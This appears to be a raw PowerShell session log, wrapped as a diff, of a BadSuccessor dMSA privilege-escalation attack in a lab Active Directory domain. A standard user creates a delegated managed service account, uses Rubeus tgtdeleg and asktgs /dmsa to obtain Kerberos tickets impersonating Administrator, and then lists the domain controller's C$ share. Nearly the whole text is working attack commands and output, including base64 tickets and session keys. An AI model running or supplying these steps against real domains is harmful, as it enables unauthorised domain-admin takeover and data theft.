@@ -1,0 +1,239 @@
+PS C:\Scripts\Rubeus>
+PS C:\Scripts\Rubeus> klist
+$name = 'SU-EnforceT3'
+
+$path = 'OU=dMSAs,OU=Misconfigs,DC=domain,DC=root'
+#$path = 'CN=System,DC=domain,DC=root'
+$delegatedadmin = 'StandardUser'
+$delegatetarget = 'Administrator'
+$domain = 'domain.root'
+
+# Create dMSA
+BadSuccessor -mode exploit -Path $path -Name $name -DelegatedAdmin $delegatedadmin -DelegateTarget $delegatetarget -domain $domain
+
+Current LogonId is 0:0x13eb7d99
+
+Cached Tickets: (4)
+
+#0>     Client: StandardUser @ DOMAIN.ROOT
+        Server: krbtgt/DOMAIN.ROOT @ DOMAIN.ROOT
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 5/29/2025 22:17:49 (local)
+        End Time:   5/30/2025 8:17:49 (local)
+        Renew Time: 6/5/2025 22:17:49 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: INHERITANCEII
+
+#1>     Client: StandardUser @ DOMAIN.ROOT
+        Server: ldap/InheritanceII.domain.root @ DOMAIN.ROOT
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 5/29/2025 22:17:50 (local)
+        End Time:   5/30/2025 8:17:49 (local)
+        Renew Time: 6/5/2025 22:17:49 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: InheritanceII.domain.root
+
+#2>     Client: StandardUser @ DOMAIN.ROOT
+        Server: LDAP/InheritanceII.domain.root/domain.root @ DOMAIN.ROOT
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 5/29/2025 22:17:49 (local)
+        End Time:   5/30/2025 8:17:49 (local)
+        Renew Time: 6/5/2025 22:17:49 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: InheritanceII.domain.root
+
+#3>     Client: StandardUser @ DOMAIN.ROOT
+        Server: host/inheritanceiii.domain.root @ DOMAIN.ROOT
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 5/29/2025 22:17:49 (local)
+        End Time:   5/30/2025 8:17:49 (local)
+        Renew Time: 6/5/2025 22:17:49 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: InheritanceII.domain.root
+Creating dMSA at: LDAP://domain.root/OU=dMSAs,OU=Misconfigs,DC=domain,DC=root
+0
+0
+0
+0
+Successfully created and configured dMSA 'SU-EnforceT3'
+Object StandardUser can now impersonate Administrator
+PS C:\Scripts\Rubeus>
+PS C:\Scripts\Rubeus> # Try to view domain controller share as StandardUser
+ls \\InheritanceII.domain.root\c$
+
+# Get TGT for "StandardUser"
+.\Rubeus.exe tgtdeleg /nowrap /outfile:sutgt.kirbi
+Get-ChildItem:
+Line |
+   2 |  ls \\InheritanceII.domain.root\c$
+     |  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     | Access to the path '\\InheritanceII.domain.root\c$' is denied.
+Get-ChildItem:
+Line |
+   2 |  ls \\InheritanceII.domain.root\c$
+     |  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     | Cannot find path '\\InheritanceII.domain.root\c$' because it does not exist.
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/InheritanceII.domain.root'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: oN52lhETEUZKXDuJPTv5M3ymirefSuoGNTr1oaL0ib8=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIF1DCCBdCgAwIBBaEDAgEWooIE2DCCBNRhggTQMIIEzKADAgEFoQ0bC0RPTUFJTi5ST09UoiAwHqADAgECoRcwFRsGa3JidGd0GwtET01BSU4uUk9PVKOCBJIwggSOoAMCARKhAwIBAqKCBIAEggR8xHZFRkwKLzFLWkJjGwvoLKhepo0j6NL7weDk5nEVkSSNpVSVlT5R80LzSY3LkR4HO2DcP8AcJAlyA3EYCIUEgsLJB8j2FkbzRBaaVqvvK9zIPt6bEOcX/gca85WYCr50+VyiNVwD6HX8vDmMG4iEiFQGYLh4wkIsA0qUyBDSI3JDGRU9lMQkkXyO11OhesIDCQx16NIBfl0m5W28qZR5NsyiQaWMcFUMadJgZhtkVYGYHyCCBgCLOyjxW/Xlbhrg36xjKpmR061a9HHBHbiLJBGs5vPXKTphU1cTRbw2M+dh+IuLbiGkaLI0dsbrLB23wrgHZ/Ws4ycA5iHNCo9Vkb3L3QpORuShxL572oCLKivvvKB/0Dr0f80aHfNbiW5+ki6/6fAe3NWvLMY2+YCKVsSH+3OJAO/8z8uZ9NNUU+Md4TibLEdOysrf3fiE0KF6sK6aGAD33iSpoW8o96pUaWKRrs9SHXYLhmLQRnR6eKxT/CoB7zx6FTsy3w0xVApcV8SbU74LypDDm9F96UBd70b7JSuuZ8QBrDEin/wzGnzxoC3JFRw+ccHm7h03CRq9xXHZ52y9Y61JlOl8g7u/UT8ZfE4EfmJ4Y2CK17WjKk6mOt0RxgCBbxw103qK+0tU0RQNBT5nBkc9Rm8V5IGAZJLFxWedj+D/6+E5VbSUVgFGgSEWVdU8NqlqHD7OgR54vMamge0BXFKkK6iLmNRl2iIjdR3Qe8Da315zopc9uGrtiu9vOF2ZQeAwja4Fmyn6qWS9U5RqqXfYPHftxLycfbgualNo7cm5PVUnlKFf4gV4CSyM4ndkjKB4HxtJ87NBrtEE4S4EtuXgfQH2vxkcIX9SJeXce5Svs/UGYQUHnA6Ca296lVROIFR/eakKDlzgH2Dx16n//4lixez+R870VNfnpBpTLCpw86kFjG4HD5r+Vac1ko3fx/RJPBLrdV2PgGSHDpRisxqeabVFlk4FC/hgyFtRBNl2p0r2fywnO2zTCF/ABBRsutZctlnryiT3cGMCe+5NFN0o/vPQBNyUHblDxGLVG5/noPZ4xMqIF8YZd1ktv/dRrARcAGr70Yg7UJrosxRi7EScvLUU14p2WNuX9gMcR+rJ0guB+dfql49vPkV4MVt4vWAgd3B3vdNnXDKt9Z3XvN9WmuFMP75m+MtCejbCZ/Hn4ao3eYHzJY8dW3xdyENCIkvOAWz0tLX6ckHhxbOd/QEdadX+mEme2e6sNBiioDTo/qb1jNoxWr7uGRr6EahInRn8BSjD7zZS2nmaNzvwl/1Hmk1XLd4J5WgbKKg6LwQWSD8KpEFsT9CsP0nOFp1Nca1DUnEanUHnl0mRwyby34jHiZccg6XXzyz0hnjDapzfRotutU9uL6T42FJPnRIKbweRjHqUMKigSjRpMgmCDeV7jK/JsZZl8FK008Bb9AL9yLazZMTL3whjPBGCdOZO5xkQ51/AdVx9lLUS0turE/cf98rGAIftmUHUMN0SjWT2zYh42o7Q7/cijxqPBXtXPAYZKiujgecwgeSgAwIBAKKB3ASB2X2B1jCB06CB0DCBzTCByqArMCmgAwIBEqEiBCAKfA8kvH1mvP2nkuy0QTPhMhjS7ABL9WX7EPEYhCfW9KENGwtET01BSU4uUk9PVKIZMBegAwIBAaEQMA4bDFN0YW5kYXJkVXNlcqMHAwUAYKEAAKURGA8yMDI1MDUzMDAzMTgyNVqmERgPMjAyNTA1MzAxMzE3NDlapxEYDzIwMjUwNjA2MDMxNzQ5WqgNGwtET01BSU4uUk9PVKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLRE9NQUlOLlJPT1Q=
+PS C:\Scripts\Rubeus>
+PS C:\Scripts\Rubeus> $b64 = Get-Clipboard
+$bytea = [Convert]::FromBase64String($b64)
+[IO.File]::WriteAllBytes("C:\Scripts\Rubeus\sutgt.kirbi", $bytea)
+# Request TGS for dMSA account
+.\Rubeus.exe asktgs /targetuser:$($name)$ /service:krbtgt/$domain /opsec /dmsa /nowrap /ptt /ticket:sutgt.kirbi /outfile:dMSA.kirbi
+
+# then request a tgs for a desired service as our targeted user (Administrator in that case):
+.\Rubeus.exe asktgs /user:$($name)$ /service:cifs/inheritanceII.domain.root /opsec /dmsa /nowrap /ptt /ticket:dMSA.kirbi /outfile:administrator.kirbi
+
+klist
+
+# Try to view domain controller share under context of dMSA
+ls \\InheritanceII.domain.root\c$
+
+
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building DMSA TGS-REQ request for 'SU-EnforceT3$' from 'StandardUser'
+[+] Sequence number is: 1465329839
+[*] Using domain controller: InheritanceII.domain.root (10.10.15.200)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIF/jCCBfqgAwIBBaEDAgEWooIFATCCBP1hggT5MIIE9aADAgEFoQ0bC0RPTUFJTi5ST09UoiAwHqADAgECoRcwFRsGa3JidGd0GwtET01BSU4uUk9PVKOCBLswggS3oAMCARKhAwIBAqKCBKkEggSlS8K7NYcPDtueY428YjhT+QC9Ru+aif39NU80U8oOyz8+q1yJkSxdayLqhEJSr0hYnQMp/+9x+i9wTMHfYZLBQ1oN6VciF1Z0mKktFnN/KGmGWZA4MVsw2DH6fmyipxgXP57RcXSbHI94qbeMfTeF4vD0X4rhfu6EvYu09RUpYZYmzpYeSVHFQFJOqWYT+pRHhruActGd9srfks/yzbAs7m865ceg2vavz+rCredJt5WcSzjewkYCdI3ZG/rXwRn4yyVfgBNKMId731tnUCkOERh4lCCNmdWsrbGms/eOXvOn+SJDIOBrrJWGM4H64Wh5mAjc458FhKJrNzYGr7zUeDCZjgac01Pw5xEewM5sc4+OBxHjfK5h2h8VFDOoclns1ctvJa6MtszPA8GEKWsOgq6qIzuDfwx548NW28wd1UuDF8znwEk3qznU1L1vmpx0BEdBh/Lit9Y51sBa+7sNrE20mCyNOURRw96fQ7lbhIfPUR1OryQ/27klPq5LYPG+UABgRlckbg0kdG5UUykmp+L4J39atww7qSK3uWW5fgqeEqgD0gPIuCuMCUNJ9klSy3eTPAg3BqZhs/AWj4pVWmDydAh/NTdscRN/WFL39CtHajoVoRvIvnkbFW5VBe6bZOxaysvnT9+lruCGJpPrR6ZD+bIdL91FVVxWRO0PsNkaMibcBuMbp7sXt+GybexHj/VjY0RhF31Cu1FpbkU7Qom/1vKaZ81HCHo9G+xC+qE39hA9OLcrHgPacUVuj8gx+KIjkF5XKlnu0qizYBSQq9mH30LTG18vhfVOWSItb+vhLBxFh4TWH9BZjixUo+t5yAT1QTFz1o8fbgq9XIuVWXsxAQ7qkTAc46xqVwcrvd9HGL1MAdbbsTKybsr2Jang3v9qtFZcCXfrvgzsw+1qSYyZWey8wpRdWaxEh7kXoj77cPth5L9hbDajyRMwCHwfoWbzy60sVeYphFU/alwR9Sy7VnAwVNGW+45KgYybOhBjbbT1Wy5Oozc7yxDeERwf/e8/5TsdUVVhExgui+BtOi0Q77IA5fK76/HjFE0INfGRAcSqBYmsdVLVCRbWZ7hquYlemH0CmRuDYzgnCuEPHYnfh8ceqHBQaIXos7mcM03GycqBTeKPvMfZh+OLA59uxkf4UB3j0BZhRUljyRHiaxDdcSchgWTcyrzN+3aUbSyA5AsnYnCADrlwA1FXJP1elC/VFKq0hQI6Or5ND7MXf755qhPc+Y0L0rm8cLwDBwgSe7pQSassak3gupmVUH7NObT5XvH6eodZHXADJmidHTeCCe4qD+aAwSR1aAyNgs2OagaVo+h8qEkQOOOJoSWzJq2T8ZfCyRz3zseMH6gUv1yuaKG1z3tsgIJQEwKoKFRcOPjaIvMcueKbSMVLoA+1DFHCjDSzNyObYI7znThN1sFswX8LPm/RACO0ywATL0fATq9B+2y0Lm5kkV0IfTFOJur6RqH7TvmSsYVDdNKM5BG+XbMqIoMT13ZJHGZG2fcPH2vg+qSjCDv3Uv1ulqNt9FQulWU/SXQhA5vqBWTIqT6P/Ui/ossjyj0A9heYopZ4xutoj6OB6DCB5aADAgEAooHdBIHafYHXMIHUoIHRMIHOMIHLoCswKaADAgESoSIEID+4IjGefLTwIwf+v2dbKLe1n7SvTKdZdwgpg2XRmdgsoQ0bC2RvbWFpbi5yb290ohowGKADAgEBoREwDxsNU1UtRW5mb3JjZVQzJKMHAwUAYKEAAKURGA8yMDI1MDUzMDAzMTg1NFqmERgPMjAyNTA1MzAwMzMzNTRapxEYDzIwMjUwNjA2MDMxNzQ5WqgNGwtET01BSU4uUk9PVKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLRE9NQUlOLlJPT1Q=
+
+  ServiceName              :  krbtgt/DOMAIN.ROOT
+  ServiceRealm             :  DOMAIN.ROOT
+  UserName                 :  SU-EnforceT3$ (NT_PRINCIPAL)
+  UserRealm                :  domain.root
+  StartTime                :  5/29/2025 10:18:54 PM
+  EndTime                  :  5/29/2025 10:33:54 PM
+  RenewTill                :  6/5/2025 10:17:49 PM
+  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  P7giMZ58tPAjB/6/Z1sot7WftK9Mp1l3CCmDZdGZ2Cw=
+  Current Keys for SU-EnforceT3$: (aes256_cts_hmac_sha1) C2DC8AE33DB9BB14C0AD402BB05B8C37A3221AAFE4DE7821202AF071D79A7F69
+
+
+[*] Ticket written to dMSA.kirbi
+
+
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building DMSA TGS-REQ request for '' from 'SU-EnforceT3$'
+[+] Sequence number is: 929089351
+[*] Using domain controller: InheritanceII.domain.root (10.10.15.200)
+[+] TGS request successful!
+[*] '/opsec' passed and service ticket has the 'ok-as-delegate' flag set, requesting a delegated TGT.
+[+] Sequence number is: 128298873
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  cifs/inheritanceII.domain.root
+  ServiceRealm             :  DOMAIN.ROOT
+  UserName                 :  SU-EnforceT3$ (NT_PRINCIPAL)
+  UserRealm                :  domain.root
+  StartTime                :  5/29/2025 10:18:59 PM
+  EndTime                  :  5/29/2025 10:33:54 PM
+  RenewTill                :  6/5/2025 10:17:49 PM
+  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  MSWprll7XoCl5lm+E7PMLR3BLH36kdE3ZWrW0BbgBLg=
+
+
+[*] Ticket written to administrator.kirbi
+
+
+
+Current LogonId is 0:0x13eb7d99
+
+Cached Tickets: (2)
+
+#0>     Client: SU-EnforceT3$ @ domain.root
+        Server: krbtgt/DOMAIN.ROOT @ DOMAIN.ROOT
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 5/29/2025 22:18:54 (local)
+        End Time:   5/29/2025 22:33:54 (local)
+        Renew Time: 6/5/2025 22:17:49 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+#1>     Client: SU-EnforceT3$ @ domain.root
+        Server: cifs/inheritanceII.domain.root @ DOMAIN.ROOT
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 5/29/2025 22:18:59 (local)
+        End Time:   5/29/2025 22:33:54 (local)
+        Renew Time: 6/5/2025 22:17:49 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+
+    Directory: \\InheritanceII.domain.root\c$
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d----           5/17/2025 11:37 AM                inetpub
+d----            4/1/2024  2:02 AM                PerfLogs
+d-r--           5/17/2025  1:23 PM                Program Files
+d-r--           5/17/2025  1:10 PM                Program Files (x86)
+d-r--           5/17/2025 11:33 AM                Users
+d----           5/17/2025  2:10 PM                Windows
+
+PS C:\Scripts\Rubeus>
